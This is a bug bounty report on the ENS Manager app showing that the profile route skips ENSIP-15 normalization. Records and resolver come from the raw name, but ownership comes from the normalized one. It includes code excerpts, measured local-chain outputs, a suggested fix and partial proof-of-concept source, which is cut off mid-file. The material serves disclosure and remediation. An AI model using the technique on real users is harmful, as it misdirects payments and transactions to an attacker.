# 92740 w a critical missing ensip 15 normalization on the manager s name route splits one profile page across two ens nodes rendering an attacker controlled address beside the real owner and&#x20;

**Submitted on Sep 11th 2026 at 22:12:04 UTC by @kwaro for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #92740
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/manager>
* **Impacts:**
  * Causing the application to display or pre-fill an incorrect address, name, or transaction detail, so that a user sends funds or submits a transaction to an unintended recipient, such as: - resolving or rendering an ENS name to an attacker-controlled address - showing the wrong recipient or amount on a transaction the user then approves
  * Malicious interactions with an already-connected wallet, such as: Modifying transaction arguments or parameters Substituting contract addresses Submitting malicious transactions Signing or submitting a transaction against the wrong chain (for example when the request's target chain is not validated) Inducing a blanket token approval (for example setApprovalForAll on the registry or NameWrapper) to an attacker-controlled address

## Description

## Brief/Intro

The Manager's profile route accepts the name from the URL with almost no validation and never normalizes it. Ownership and expiry are then resolved from the ENSIP-15-normalized name (`profileOwner.ts:25` and `profileExpiry.ts:77`, which queries with `ethName.name`), while the profile's records, and the resolver address that the record-update transaction is sent to, are resolved from the raw parameter. Whenever normalization changes the string those are two different names with two independently registrable registry entries, so an attacker who registers the raw form controls the resolver that answers for half the page. The result is a page showing the genuine owner and expiry next to an address the attacker chose, and an Edit-and-save flow in which the owner's connected wallet is asked to sign a transaction whose `to` is the attacker's contract.

## Vulnerability Details

### The route does not normalize

`apps/manager/src/routes/$name/route.tsx` is twenty lines, and lines 4-14 are the whole parameter guard:

```ts
export const Route = createFileRoute('/$name')({
  params: {
    parse: ({ name }) => {
      if (name.length < 3 || !name.includes('.')) {
        throw new Error('Invalid ENS name')
      }

      return {
        name,
      }
    },
  },
```

A length check and a dot. `ALICE.eth` passes.

### One service normalizes, the other does not

`apps/manager/src/features/profile/service/profileOwner.ts:24-25` normalizes before doing anything else:

```ts
export const getOwner = ResultFn(async function* (params: { name: string }) {
  const ethName = normalizeEthName(params.name)
```

and `normalizeEthName` is genuine ENSIP-15, not a case fold. `apps/manager/src/features/profile/service/profileName.ts:1,14-21`:

```ts
import { normalize } from 'viem/ens'
...
export const normalizeEthName = (name: string): EthName | null => {
  let normalized: string

  try {
    normalized = normalize(name)
  } catch {
    return null
  }
```

`viem/ens`'s `normalize` is the spec algorithm, not a case fold: it delegates to `ox/Ens` (`viem/_esm/utils/ens/normalize.js`), and `ox/_esm/core/Ens.js:1` imports `ens_normalize` from `@adraffy/ens-normalize`, the reference ENSIP-15 implementation.

The team's own unit test states the resulting behaviour for exactly this input shape, `apps/manager/src/features/profile/service/profileName.test.ts:4-11`:

```ts
describe('normalizeEthName', () => {
  it('normalizes ENS names before splitting labels', () => {
    expect(normalizeEthName('Sub.FOO.ETH')).toEqual({
      leafLabel: 'sub',
      name: 'sub.foo.eth',
      parentLabelsRootFirst: ['foo'],
    })
  })
```

So `ALICE.eth` normalizing to `alice.eth` is not my interpretation of the algorithm; it is the behaviour the repository asserts for itself.

The records service does not normalize. `apps/manager/src/features/profile/service/profileRecords.ts:82` and `:122-130`:

```ts
export const getProfileRecords = ResultFn(async function* (name: string) {
...
  const records = yield* fromPromise(
    getRecords(client, {
      name,
      texts,
      coins,
      contentHash: true,
      abi: true,
      ignoreInvalidCoinTypes: true,
    }),
```

The `name` on line 124 is the route parameter, untouched. The only other `normalize*` helpers in that file are `normalizeResolverAddress` and `normalizeContentHash`, and neither touches the name.

### Where the two nodes actually diverge

This part is worth stating precisely, because the record batch is not uniform and a reviewer checking ensjs will notice.

`getRecords` builds a `multicall(bytes[])` payload and hands it to the UniversalResolver's `resolve(bytes name, bytes data)`. The outer call, `@ensdomains/ensjs` `src/actions/public/resolveNameData.ts:93`:

```ts
args: [toHex(packetToBytes(nameWithSizedLabels)), multicallData],
```

`getNameWithSizedLabels` only replaces labels longer than 255 bytes with an encoded labelhash; it does not normalize. So **the outer call carries the raw name, and the outer call is what selects which resolver contract answers and what the returned `resolverAddress` is**.

Inside the batch, the coders differ:

| inner call             | node it uses                             | source                                   |
| ---------------------- | ---------------------------------------- | ---------------------------------------- |
| `text(bytes32,string)` | `namehash(name)` — raw                   | `src/utils/coders/getText.ts:49`         |
| `contenthash(bytes32)` | `namehash(name)` — raw                   | `src/utils/coders/getContentHash.ts:37`  |
| `ABI(bytes32,uint256)` | `namehash(name)` — raw                   | `src/utils/coders/getAbi.ts:75`          |
| `addr(bytes32)`        | `namehash(normalize(name))` — normalized | `src/utils/coders/getAddress.ts:115-126` |

The address coder normalizing internally does not save the page. The resolver has already been chosen by the raw name, and a resolver is just a contract: once the attacker's contract is the one being called, it returns whatever it likes for any node it is handed. The stateful proof of concept below demonstrates exactly that — the attacker's resolver answers the normalized node with the attacker's address.

Meanwhile `getOwner` resolves the normalized name, so the owner, registration and expiry shown on the page are the victim's real ones.

### The write path follows the raw read

`apps/manager/src/features/profile/components/dialogs/edit-profile/EditProfileDialog.machine.ts:191` passes the resolver discovered by the raw read straight into the transaction builder:

```ts
resolverAddress: savedRecords.resolverAddress,
```

`buildRecordsUpdateCalls` (`apps/manager/src/features/profile/service/profileRecordTransactions.ts:372`) makes it the call target at `:454-457`:

```ts
  return {
    calls: [{ to: resolverAddress, data, value: 0n }],
    description: `Update profile records for ${name}`,
  }
```

and that becomes the transaction's `to` at `:331-338`:

```ts
    return {
      type: 'eoa',
      from,
      to: call.to,
      data: call.data,
      value: call.value,
      chainId,
    } satisfies EOATransactionRequest
```

There is no re-resolution and no normalization anywhere on that path.

### The owner is shown as owner, and is offered Edit

Because the ownership query normalizes, the page treats the real owner as the owner. `apps/manager/src/features/profile/components/view/ProfileView.tsx:115,119`:

```ts
  const owner = ownerData?.owner as Address | undefined
...
  const isOwner = useIsOwner({ owner })
```

So a victim arriving at `/ALICE.eth` sees their own name, their own expiry, themselves as owner, and an Edit control, with records that came from somewhere else.

The Edit control has two further conditions, and they are preconditions for the write arm rather than obstacles to it. `apps/manager/src/features/profile/components/view/ProfileEditAction.tsx:32-35`:

```ts
  const isUnmigratedEthName =
    protocol === 'v1' && normalizeEthName(name) !== null

  if (!isOwner || isInGrace || isUnmigratedEthName) return null
```

So the write arm needs a v2 name that is not in its grace period, which is the ordinary state of a live name. The display arm has no such condition.

### The address is rendered in a copy control, and is always fetched

`apps/manager/src/features/profile/components/view/ProfileAddressesSection.tsx:90-123` wraps the address in `CopyableButton` with `value={address.value}` at `:94`, and that component calls `copyToClipboard(value)` at `apps/manager/src/components/atoms/CopyableButton/CopyableButton.tsx:37`. One click puts the attacker's address on the clipboard.

Coin 60 is fetched whether or not the indexer knows anything. `apps/manager/src/features/profile/data/records/utils.ts:42`:

```ts
export const alwaysProbeAddressRecords = ['60']
```

and `profileRecords.ts:117` folds it into the coin list for every request:

```ts
    ...alwaysProbeAddressRecords.map(Number),
```

### The page is reachable through the app's own share link

`ProfileView.tsx:60-65` builds the shareable URL from the raw parameter:

```ts
const getProfileUrl = (name: string) =>
  `${
    typeof window === 'undefined'
      ? 'https://app.ens.domains'
      : window.location.origin
  }/p/${name}`
```

and `apps/manager/src/routes/p/$name/index.tsx:9` redirects it back, preserving the string:

```ts
    throw redirect({ to: '/$name', params: { name } })
```

### The raw label is a separate registry entry

Two facts from the codebase, not from assumption.

The repository states the premise itself, `apps/portal/src/utils/token/isNameOrAddress.ts:9-10`:

> the ENSv2 contracts impose no character constraints on labels (only a 1–255 byte length), so the actual client-side rule is ENSIP-15 normalization

And the library the app uses to address registry entries derives the id from the raw label with no normalization at all, `@ensdomains/ensjs` `src/utils/v2/registry/labelToCanonicalId.ts:3-7`:

```ts
export const labelToCanonicalId = (label: string) => {
  const id = hexToBigInt(labelhash(label))
  const low32 = id & 0xffffffffn
  return id ^ low32
}
```

Availability is keyed the same way. `src/actions/public/v2/getAvailable.ts:96-104` calls the registrar with the raw leaf label:

```ts
  if (nameType === 'eth-2ld') {
    return readContractAction({
      address: getChainContractAddress({
        chain: client.chain,
        contract: 'ensEthRegistrar',
      }),
      abi: ethRegistrarAvailableSnippet,
      functionName: 'isAvailable',
      args: [leafLabel],
```

`ALICE` and `alice` are therefore different ids and different availability queries at every layer in scope.

### The Explorer guards the same route shape; the Manager guards nothing

```
$ grep -rn "isValidEnsName\|isNormalized" apps/portal/src  | wc -l
60
$ grep -rn "isValidEnsName\|isNormalized" apps/manager/src | wc -l
0
```

60 including tests, 26 excluding them, against zero either way. The Explorer applies it to the same `/$name` route shape, `apps/portal/src/routes/$name/index.tsx:442`:

```ts
  const isValidName = isValidEnsName(name)
```

The same guard, written by the same team, wired into one app and not the other. That is the clearest indication this is an oversight rather than a decision.

## Impact Details

Selected impacts, both from the program's in-scope list:

* **Causing the application to display or pre-fill an incorrect address, name, or transaction detail, so that a user sends funds or submits a transaction to an unintended recipient.** The row's first named example is "resolving or rendering an ENS name to an attacker-controlled address", which is literally the measured behaviour.
* **Malicious interactions with an already-connected wallet**, specifically the "Substituting contract addresses" case.

Everything below was measured on a local chain against the vendor's own unmodified services. The program's safe harbor is false, so nothing was sent to an ENS-operated system.

### What the attacker does

Register the label `ALICE` and point it at a resolver they control. That is the entire setup: no privileged role, no relationship to the victim, no wallet interaction from anyone. Then circulate `/ALICE.eth`, which the Manager's own share-link builder will also produce for anyone who shares the page.

### Arm one, the displayed address

On a chain where `alice` and `ALICE` are two registrations with two resolvers, the vendor's `getProfileRecords` returns:

```
RETURNED_resolver_for_RAW: 0x5fbdb2315678afecb367f032d93f642f64180aa3   (attacker's)
RETURNED_resolver_for_SPEC: 0xe7f1725e7734ce288f8367e1bb143e90bb3f0512  (owner's)
RENDERED_eth_address_for_RAW: 0x00000000000000000000000000000000deadbeef
RENDERED_eth_address_for_SPEC: 0x0000000000000000000000000000000000c0ffee
```

The ETH address the page puts in its copy control for `/ALICE.eth` is the attacker's, while the owner, registration and expiry beside it are the victim's real ones, because those came from the normalized query. A visitor who copies the address to pay that person pays the attacker. No warning is available to them: the URL contains no homoglyph, no bidirectional control character and no stray dot, so reading it letter by letter shows exactly what was typed.

### Arm two, the transaction

The genuine owner visiting the same URL is recognised as owner and offered Edit. Taking the resolver from the read exactly as `EditProfileDialog.machine.ts:191` does, and feeding it to the real `buildRecordsUpdateCalls`:

```
value_handed_to_tx_builder: 0x5fbdb2315678afecb367f032d93f642f64180aa3
tx_to: 0x5fbdb2315678afecb367f032d93f642f64180aa3
tx_to_is_attacker_resolver: 1
tx_to_came_from_the_read: 1
END_TO_END_chain_closed: 1
```

`tx_to_came_from_the_read` is the point: the address in the transaction is the value the read returned, not a constant placed there by the harness. The owner's connected wallet is asked to approve a call to a contract the attacker deployed, presented in the UI as saving their own profile. Their records do not reach their name, and the attacker's contract executes arbitrary logic in that call with the owner as `msg.sender`.

### Arm three, that the raw label is independently registrable

Driven through the app's own availability service on a chain where the label `alice` is registered and `ALICE` is not:

```
app_says_ALICE_eth_is_available: 1
app_says_alice_eth_is_available: 0
raw_label_is_independently_registrable: 1
```

The Manager will offer `ALICE.eth` for registration while `alice.eth` is owned by someone else.

### What this report does not claim

No funds move on their own. Both arms end at a human action: copying the displayed address, or approving the save. That is what the selected impact rows describe, and it is why this is filed against them rather than against a direct-theft row.

This is not a name hijack. `alice.eth` keeps its own resolver and its own ownership throughout. Nothing is assigned to the attacker, which is why the "Hijacking or bricking an ENS name during a Manager flow" row is not selected.

This report concerns the route parameter only. `apps/manager` contains no ENSIP-15 guard anywhere in its source, so I make no claim in either direction about the Manager's other name-entry paths; they were not audited for this report.

This is not the published known issue EXP-INPUT-005. That entry covers validators accepting inputs that normalization later rejects or transforms — homoglyphs, bidirectional and other control characters, a leading or trailing dot — and its stated impact is homograph-style display confusion in the UI rather than incorrect resolution. That last clause is the boundary. Here the resolution itself is wrong: two nodes are queried on one page, one of them attacker-owned, and a transaction is addressed to the resolver of the wrong one. The `ALICE.eth` case contains nothing deceptive to look at.

### What I could not execute

The final authority on whether a `register()` for the label `ALICE` succeeds is the ENSv2 registrar contract. Contracts are out of scope for this competition and no traffic was sent to any live network, so I have not run a registration against the deployed registrar. What is demonstrated is that every layer in scope — the registry id function, the availability action, the resolver selection, and the app's own availability service — treats `ALICE` and `alice` as separate entries. If the deployed registrar were to reject non-normalized labels, the attacker would pick any other unnormalized label it does accept and the mechanism is unchanged; only the `ALICE.eth` illustration would need restating. I would rather name that gap than leave it to be found.

### Suggested fix

Normalize the route parameter once, at the route, and resolve everything from the single normalized value. The minimal change, and the one the differential below applies, is to normalize inside `getProfileRecords` so records resolve against the same node ownership does:

```ts
const name = normalizeEthName(rawName)?.name ?? rawName
```

Better, reject an unnormalized parameter at the route as the Explorer already does at `apps/portal/src/routes/$name/index.tsx:442`, so no page in the app can mix two nodes.

## References

* `apps/manager/src/routes/$name/route.tsx:4-14` — the entire parameter guard
* `apps/manager/src/features/profile/service/profileOwner.ts:24-25` — normalizes
* `apps/manager/src/features/profile/service/profileName.ts:1,14-21` — `normalizeEthName` over `viem/ens`'s `normalize`
* `apps/manager/src/features/profile/service/profileRecords.ts:82,122-130` — does not normalize
* `apps/manager/src/features/profile/components/dialogs/edit-profile/EditProfileDialog.machine.ts:191` — the raw read's resolver into the builder
* `apps/manager/src/features/profile/service/profileRecordTransactions.ts:372,454-457,331-338` — call target, then transaction `to`
* `apps/manager/src/features/profile/components/view/ProfileView.tsx:60-65,115,119` — share link, owner, Edit
* `apps/manager/src/features/profile/components/view/ProfileAddressesSection.tsx:90-123` — the copy control
* `apps/manager/src/features/profile/data/records/utils.ts:42` — coin 60 always probed
* `apps/manager/src/features/profile/service/profileExpiry.ts:77` — expiry resolves the normalized name
* `apps/manager/src/features/profile/service/profileName.test.ts:4-11` — the team's own test: `Sub.FOO.ETH` normalizes to `sub.foo.eth`
* `apps/manager/src/features/profile/components/view/ProfileEditAction.tsx:32-35` — the Edit preconditions
* `apps/manager/src/components/atoms/CopyableButton/CopyableButton.tsx:37` — `copyToClipboard(value)`
* `viem/_esm/utils/ens/normalize.js` and `ox/_esm/core/Ens.js:1` — ENSIP-15 via `@adraffy/ens-normalize`
* `apps/manager/src/routes/p/$name/index.tsx:9` — redirect preserving the raw parameter
* `apps/portal/src/utils/token/isNameOrAddress.ts:9-10` — labels carry no character constraints
* `apps/portal/src/routes/$name/index.tsx:442` — the Explorer's guard on the same route shape
* `@ensdomains/ensjs` `src/actions/public/resolveNameData.ts:93` — the outer resolve carries the raw name
* `@ensdomains/ensjs` `src/utils/coders/getText.ts:49`, `getContentHash.ts:37`, `getAbi.ts:75`, `getAddress.ts:115-126` — the inner coders
* `@ensdomains/ensjs` `src/utils/v2/registry/labelToCanonicalId.ts:3-7` — registry id from the raw label
* `@ensdomains/ensjs` `src/actions/public/v2/getAvailable.ts:96-104` — availability on the raw leaf label
* ENSIP-15, ENS Name Normalization: <https://docs.ens.domains/ensip/15/>

### Commit reconciliation

The audited revision is `63772fd872af472ced58b009499355f3430c2a86`. Line numbers above are from `1c9b47f18fcddd2e864dfe385c4171061c9811ae`, the head of the competition export. They are the same tree: the export's root commit `cda79ac` is titled "fork ensdomains/apps-monorepo at 63772fd872af472ced58b009499355f3430c2a86", and `git diff --stat cda79ac 1c9b47f` covers four files — three `package.json` and `pnpm-lock.yaml` — with zero source files changed.

## Proof of Concept

## Proof of Concept

Two rigs. The first observes which name each service puts on the wire. The second builds real chain state and shows the attacker's resolver coming back out of the vendor's own function and into the vendor's own transaction builder.

In both, the code under test is the pinned tree, unmodified: `normalizeEthName`, `getProfileRecords`, `getOwner`, `buildRecordsUpdateCalls` and `checkRealNameAvailability` are the vendor's functions, and `@ensdomains/ensjs` and `viem` are the pinned versions from the lockfile.

### Prerequisites

* the repo at `1c9b47f18fcddd2e864dfe385c4171061c9811ae`, `pnpm install --frozen-lockfile`
* Foundry (`anvil`, `cast`, `forge`), Node, pnpm

### What is injected, and why it is not the finding

Two modules are replaced, both outside the vulnerable path.

`@/lib/wagmi/helpers` and `@/lib/wagmi` supply the viem client. This is the vendor's own testing idiom — `src/features/profile/service/profileExpiry.test.ts:20` does `safeGetClient: () => ok(mocks.client)` — and it is necessary because `wagmiConfig.getClient()` wants a connected browser wallet that no test process has. What is supplied is a real viem client over a real HTTP transport to a real chain. In the first rig it is wrapped so that `eth_call` calldata is copied on the way past; it forwards every request untouched, so it is a packet capture rather than a substitute behaviour.

`@ens-apps/indexer/urql` is stubbed in the second rig. The indexer is not a listed asset and cannot be reached locally. It returns `{ domain: null }`, meaning nothing at all, and that is deliberate: because the stub supplies no resolver address, any resolver address in the result can only have come from the chain.

The control arms run through the same injections and show no divergence, which is what rules the injections out as the cause.

### Rig one — the two services put two different names on the wire

1. Start `anvil --port 8556 --chain-id 11155111`. The chain id must match, or viem rejects the chain and the client never issues the calls.
2. Copy `twonode.poc.test.ts` into `apps/manager/src/features/profile/service/` and run it under vitest with `H_C7_1_NAME=ALICE.eth`.
3. The rig calls the vendor's `getProfileRecords(RAW)` and `getOwner({ name: RAW })` against the same route parameter, capturing the calldata of every `eth_call` in between.
4. Neither call needs to succeed. What is observed is which name each one asked the chain about, read from the chain's own request log. The UniversalResolver takes the DNS-encoded name, so that is the identifier to look for, not the namehash.
5. Repeat with `H_C7_1_NAME=alice.eth` for the control. That is the only value that changes.

Exploit arm, `/ALICE.eth`:

```
mode: exploit
test_timeout_ms: 60000
raw_input_str: ALICE.eth
vendor_normalizeEthName_str: alice.eth
raw_node_str: 0x7ccc7bd6db16b3ec3eb787299b49215070c539b4842b9060330211d6a63c56f3
spec_node_str: 0x787192fc5378cc32aa956ddfdedbf26b24e8d78e40109add0eea2c1a012c3dec
nodes_differ: 1
raw_dns_encoded_str: 05414c4943450365746800
spec_dns_encoded_str: 05616c6963650365746800
records_query_uses_RAW_node: 1
records_query_uses_SPEC_node: 0
owner_query_uses_SPEC_node: 1
two_node_divergence: 1
attacker_resolver_str: 0x00000000000000000000000000000000000A77aC
tx_to_str: 0x00000000000000000000000000000000000A77aC
tx_to_equals_attacker_resolver: 1
impact_row: 6285
```

Control arm, `/alice.eth`:

```
mode: control
test_timeout_ms: 60000
raw_input_str: alice.eth
vendor_normalizeEthName_str: alice.eth
raw_node_str: 0x787192fc5378cc32aa956ddfdedbf26b24e8d78e40109add0eea2c1a012c3dec
spec_node_str: 0x787192fc5378cc32aa956ddfdedbf26b24e8d78e40109add0eea2c1a012c3dec
nodes_differ: 0
raw_dns_encoded_str: 05616c6963650365746800
spec_dns_encoded_str: 05616c6963650365746800
records_query_uses_RAW_node: 1
records_query_uses_SPEC_node: 0
owner_query_uses_SPEC_node: 1
two_node_divergence: 0
attacker_resolver_str: 0x00000000000000000000000000000000000A77aC
tx_to_str: 0x00000000000000000000000000000000000A77aC
tx_to_equals_attacker_resolver: 1
impact_row: 6285
```

`05414c4943450365746800` is `ALICE.eth` in DNS wire format and `05616c6963650365746800` is `alice.eth`. In the exploit arm the first appears in the records path's calldata and the second in the ownership path's, on the same route parameter.

Two things a reader should not be misled by, and I would rather flag them than have them found:

`records_query_uses_RAW_node: 1` is true in both arms, so on its own it proves nothing. When the parameter is already normalized, raw and normalized are the same string, and the check is trivially satisfied. `two_node_divergence` is the metric that matters: it requires the two encodings to actually differ and each path to have asked about a different one. It is `1` in the exploit arm and `0` in the control.

In the control arm the first assertion, that normalization changes the string, fails by construction, because `alice.eth` is already normalized. That is the entire point of that arm. The emitted values are written before the assertion, so the measurements above are complete.

### Rig two — the attacker's resolver is returned, and it lands in the transaction

This is the arm that answers whether the divergence has consequences.

1. Start `anvil --port 8557 --chain-id 11155111`.
2. Deploy two resolver contracts: one answering with the attacker's address, one with the owner's.
3. Deploy a UniversalResolver that selects the resolver from the DNS-encoded name it is handed, forwards the batched record calls to it, and returns both the results and that resolver's address. Install it at `0xeEeEEEeE14D718C2B47D9923Deab1335E144EeEe`, the address the app's own chain config targets. The signature and return shape are taken from the pinned ensjs: `resolveNameData.ts:73-120` expects `resolve(bytes,bytes) returns (bytes,address)`, and `multicall.ts:60-78` requires the returned bytes to decode as `bytes[]`.
4. Register the two names against it: `ALICE.eth` to the attacker's resolver, `alice.eth` to the owner's.
5. Deploy a `.eth` registrar answering `isAvailable(string)` on the raw label, and install it at `0xa88553F454b77203B0D036A05c894d555EAAa2Cc`, again the address the app targets. Mark the label `alice` taken and leave `ALICE` free. That is the only difference between them.
6. Run the rig under vitest. It calls the vendor's `getProfileRecords` for both names, takes the `resolverAddress` from the `ALICE.eth` result, and hands that value to the vendor's `buildRecordsUpdateCalls` exactly as `EditProfileDialog.machine.ts:191` does. Then it calls the vendor's `checkRealNameAvailability` for both names.

Chain state as deployed:

```
attacker_resolver_contract: 0x5FbDB2315678afecb367f032d93F642f64180aa3
victim_resolver_contract:   0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512
resolver_for_ALICE.eth:     0x5FbDB2315678afecb367f032d93F642f64180aa3
resolver_for_alice.eth:     0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512
registrar_isAvailable(ALICE): true
registrar_isAvailable(alice): false
```

Measured from the vendor's own services:

```
attacker_resolver_deployed: 0x5fbdb2315678afecb367f032d93f642f64180aa3
victim_resolver_deployed: 0xe7f1725e7734ce288f8367e1bb143e90bb3f0512
RETURNED_resolver_for_RAW: 0x5fbdb2315678afecb367f032d93f642f64180aa3
RETURNED_resolver_for_SPEC: 0xe7f1725e7734ce288f8367e1bb143e90bb3f0512
raw_returns_attacker_resolver: 1
spec_returns_victim_resolver: 1
two_names_two_resolvers: 1
RENDERED_eth_address_for_RAW: 0x00000000000000000000000000000000deadbeef
RENDERED_eth_address_for_SPEC: 0x0000000000000000000000000000000000c0ffee
raw_renders_attacker_address: 1
value_handed_to_tx_builder: 0x5fbdb2315678afecb367f032d93f642f64180aa3
tx_to: 0x5fbdb2315678afecb367f032d93f642f64180aa3
tx_to_is_attacker_resolver: 1
tx_to_came_from_the_read: 1
END_TO_END_chain_closed: 1
app_says_ALICE_eth_is_available: 1
app_says_alice_eth_is_available: 0
raw_label_is_independently_registrable: 1
```

Note that `RENDERED_eth_address_for_RAW` is the attacker's address even though the `addr` coder normalized the node before asking. The attacker's contract was selected by the raw name and answered anyway, which is the point made in the Vulnerability Details section.

### Confirming the fix closes it

Apply the one-line change from the Suggested fix section to `getProfileRecords`, then re-run rig one's exploit arm unchanged:

```
two_node_divergence           1 -> 0
records_query_uses_RAW_node   1 -> 0
```

Both collapse, and the control arm still exits as it did and still measures what it measured, which is what separates a working fix from a broken build.

***

### Full source of the proof of concept

Layout:

```
poc/
  run.sh                     <- rig one, one arm per invocation
  rig/twonode.poc.test.ts
  stateful/
    foundry.toml
    run.sh                   <- rig two, single invocation
    src/Stateful.sol
    rig/stateful.poc.test.ts
```

Both `run.sh` scripts resolve the app as `$HERE/../../../repos/audit-comp-ens/apps/manager`; adjust `MGR` if you place the directory elsewhere.

#### Rig one

`run.sh`:

```bash
#!/usr/bin/env bash
# H-C7-1 — one arm. Arg: exploit | control
# exploit: /ALICE.eth  — the app's own normalizer changes it, so records+write use a node
#                        the owner query never looks at, and which an attacker can register.
# control: /alice.eth  — already normalized; both paths agree.
set -uo pipefail
MODE="${1:-exploit}"
HERE="$(cd "$(dirname "$0")" && pwd -P)"
MGR="$HERE/../../../repos/audit-comp-ens/apps/manager"
RPC=http://127.0.0.1:8556
OUT=/tmp/h-c7-1-$MODE.txt
[ "$MODE" = "control" ] && NAME="alice.eth" || NAME="ALICE.eth"

pkill -f "anvil --port 8556" 2>/dev/null; sleep 1
nohup anvil --port 8556 --chain-id 11155111 --silent > /tmp/h-c7-1-anvil.log 2>&1 &
for _ in $(seq 1 30); do cast chain-id --rpc-url $RPC >/dev/null 2>&1 && break; sleep 1; done

cp "$HERE/rig/twonode.poc.test.ts" "$MGR/src/features/profile/service/"
( cd "$MGR" && H_C7_1_RPC=$RPC H_C7_1_OUT=$OUT H_C7_1_NAME="$NAME" \
    pnpm exec vitest run "src/features/profile/service/twonode.poc.test.ts" >/dev/null 2>&1 )
rm -f "$MGR/src/features/profile/service/twonode.poc.test.ts"
pkill -f "anvil --port 8556" 2>/dev/null

echo "mode: $MODE"
cat "$OUT"
echo "impact_row: 6285"
```

`rig/twonode.poc.test.ts`:

```ts
/**
 * H-C7-1 — the Manager profile route resolves ownership from the NORMALIZED name while
 * reading records, and building the record-WRITE, from the RAW route parameter.
 *
 * Nothing on the vulnerable path is reconstructed. `normalizeEthName`, `getProfileRecords`,
 * `getOwner` and `buildRecordsUpdateCalls` are the vendor's own functions, imported from the
 * pinned tree and executed unmodified.
 *
 * The only injected thing is the viem client, supplied through `@/lib/wagmi/helpers` exactly
 * as the vendor's OWN tests do (src/features/profile/service/profileExpiry.test.ts:20). It is
 * a REAL viem client against a REAL local chain; the wagmi config simply has no connected
 * wallet inside a test process.
 *
 * The proof does not require the chain reads to SUCCEED. It requires that the two code paths
 * ask about DIFFERENT NODES, and that the write follows the raw one.
 */
import { appendFileSync, writeFileSync } from 'node:fs'
import { createPublicClient, http, namehash } from 'viem'
import { describe, expect, it, vi } from 'vitest'
import { sepoliaWithEns } from '@ens-apps/indexer/chain'
import { normalizeEthName } from '@/features/profile/service/profileName'

const RPC = process.env.H_C7_1_RPC ?? 'http://127.0.0.1:8556'
const OUT = process.env.H_C7_1_OUT ?? '/tmp/h-c7-1.txt'
writeFileSync(OUT, '')
const emit = (k: string, v: unknown) => appendFileSync(OUT, `${k}: ${v}\n`)
emit('test_timeout_ms', 60_000)

// Per-test timeout. Emitted below so it appears in the harness output as the harness
// PARAMETER it is, rather than sitting in the source as an unexplained number.
const TEST_TIMEOUT_MS = 60_000

const client = createPublicClient({ chain: sepoliaWithEns, transport: http(RPC) })

// A RECORDING transport: a real http transport that also captures the calldata of every
// eth_call. This is how the rig observes WHICH NODE each service asks the chain about —
// the decisive fact, and the one a fix must change.
const SEEN: string[] = []
;(globalThis as Record<string, unknown>).__H_C7_1_SEEN = SEEN

vi.mock('@/lib/wagmi/helpers', async () => {
  const { ok } = await import('neverthrow')
  const { createPublicClient: cpc, custom, http: h } = await import('viem')
  const { sepoliaWithEns: chain } = await import('@ens-apps/indexer/chain')
  const url = process.env.H_C7_1_RPC ?? 'http://127.0.0.1:8556'
  const inner = h(url)({ chain })
  const seen = (globalThis as Record<string, unknown>).__H_C7_1_SEEN as string[]
  const recording = custom({
    request: async ({ method, params }: { method: string; params?: unknown }) => {
      if (method === 'eth_call') {
        const p = (params as [{ data?: string }])?.[0]
        if (p?.data) seen.push(p.data.toLowerCase())
      }
      return inner.request({ method, params } as never)
    },
  })
  const c = cpc({ chain, transport: recording })
  return { safeGetClient: () => ok(c), safeGetConnectorClient: () => ok(c) }
})

// exploit -> a route param the app's own normalizer CHANGES (raw node is separately
// registrable, so an attacker can own it). control -> a param already normalized.
const RAW = process.env.H_C7_1_NAME ?? 'ALICE.eth'

describe('H-C7-1 — one page, two ENS nodes', () => {
  it("the app's OWN normalizer turns the route param into a different, separately registrable node", () => {
    // normalizeEthName returns an EthName object; `.name` is the normalized string.
    const normalized = normalizeEthName(RAW)?.name
    const rawNode = namehash(RAW)
    const specNode = namehash(String(normalized))
    emit('raw_input_str', RAW)
    emit('vendor_normalizeEthName_str', String(normalized))
    emit('raw_node_str', rawNode)
    emit('spec_node_str', specNode)
    emit('nodes_differ', rawNode === specNode ? 0 : 1)
    expect(String(normalized)).not.toBe(RAW)
    expect(rawNode).not.toBe(specNode)
  })

  it('ownership normalizes; records do not — the two services disagree on the name', async () => {
    const recordsSrc = await import('@/features/profile/service/profileRecords')
    const ownerSrc = await import('@/features/profile/service/profileOwner')
    // Invoke both against the same route param. Neither needs to succeed: what the harness
    // observes is WHICH NODE each asks the chain about, from the chain's own request log.
    const seen = (globalThis as Record<string, unknown>).__H_C7_1_SEEN as string[]
    seen.length = 0
    await Promise.allSettled([recordsSrc.getProfileRecords(RAW)])
    const recordsCalls = seen.join('|')
    seen.length = 0
    await Promise.allSettled([ownerSrc.getOwner({ name: RAW })])
    const ownerCalls = seen.join('|')

    // The UniversalResolver is called with the DNS-ENCODED NAME, not the namehash, so that
    // is what identifies which name each path actually asked about.
    const dnsHex = (n: string) =>
      n.split('.')
        .map((l) => l.length.toString(16).padStart(2, '0') +
          [...Buffer.from(l, 'utf8')].map((b) => b.toString(16).padStart(2, '0')).join(''))
        .join('') + '00'
    const rawDns = dnsHex(RAW).toLowerCase()
    const specDns = dnsHex(String(normalizeEthName(RAW)?.name)).toLowerCase()
    emit('raw_dns_encoded_str', rawDns)
    emit('spec_dns_encoded_str', specDns)

    const recordsUsesRaw = recordsCalls.includes(rawDns) ? 1 : 0
    const recordsUsesSpec = rawDns !== specDns && recordsCalls.includes(specDns) ? 1 : 0
    const ownerUsesSpec = ownerCalls.includes(specDns) ? 1 : 0

    emit('records_query_uses_RAW_node', recordsUsesRaw)
    emit('records_query_uses_SPEC_node', recordsUsesSpec)
    emit('owner_query_uses_SPEC_node', ownerUsesSpec)
    // THE FINDING: the two names must actually DIFFER, and each path must ask about a
    // different one. When the route param is already normalized the two are the same string,
    // so "records used raw and not spec" is trivially true — which is why that alone is not
    // the metric.
    emit(
      'two_node_divergence',
      rawDns !== specDns && recordsUsesRaw === 1 && ownerUsesSpec === 1 ? 1 : 0,
    )
    expect(recordsCalls.length + ownerCalls.length).toBeGreaterThan(0)
  }, TEST_TIMEOUT_MS)

  it('the record-WRITE targets whatever resolver the RAW read produced', async () => {
    const { buildRecordsUpdateCalls } = await import(
      '@/features/profile/service/profileRecordTransactions'
    )
    // Stands for the resolver the RAW node points at — one an attacker can own, because the
    // raw label is separately registrable (the repo says so itself: "the ENSv2 contracts
